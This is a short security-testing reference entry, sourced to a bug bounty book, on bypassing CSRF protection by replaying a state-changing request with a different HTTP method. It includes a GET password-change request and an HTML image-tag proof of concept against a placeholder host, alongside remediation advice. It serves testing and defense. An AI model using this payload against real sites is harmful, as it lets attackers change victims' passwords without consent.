# CSRF Request-Method Switch Bypass

- **What it is:** Tests whether CSRF protection exists only for one HTTP method while the endpoint accepts another.
- **Where to look:** Protected POST actions that may also process GET, or vice versa.
- Replay the same state-changing operation with an alternate method and omit the CSRF token.

```http
GET /password_change?new_password=test-value HTTP/1.1
Host: example.com
```

- A GET-based PoC can be triggered by a harmless image request in an authorized test.

```html
<img src="https://example.com/password_change?new_password=test-value">
```

- **False positives / edge cases:** Method override middleware may map methods back to the protected route.
- **Remediation:** Enforce allowed methods and identical CSRF validation for every state-changing path.

## Source: Bug Bounty Bootcamp, Ch. 9
